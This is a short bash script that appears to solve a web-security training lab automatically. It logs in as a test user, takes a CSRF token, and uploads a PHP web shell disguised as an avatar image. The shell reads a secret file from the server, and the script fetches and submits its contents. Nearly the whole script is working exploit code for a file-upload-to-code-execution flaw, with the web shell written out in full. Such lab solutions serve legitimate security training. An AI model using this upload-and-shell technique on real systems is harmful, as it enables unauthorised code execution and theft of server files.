#!/bin/bash

source ../common.hook

USERNAME='wiener'
PASSWORD='peter'

login $USERNAME $PASSWORD

output "GET /my-account" INFO
REQUEST=$(curl ${PS_URL}/my-account -H "Cookie: session=${COOKIE}")
extract_csrf

# PS_URL='localhost:9001'
output "POST /my-account/avatar" INFO
cat << EOF | curl ${PS_URL}/my-account/avatar -s -X POST -H "Cookie: session=${COOKIE}" -F "user=${USERNAME}" -F "csrf=${CSRF}" -F "avatar=@-;filename=webshell.php" -D -
<?php
echo file_get_contents('/home/carlos/secret');
?>
EOF

output "GET /files/avatars/webshell.php" INFO
RESULT=$(curl ${PS_URL}/files/avatars/webshell.php -H "Cookie: session=${COOKIE}")
output "Secret found: $RESULT" SUCCESS

submit_result
eval_result $PS_URL
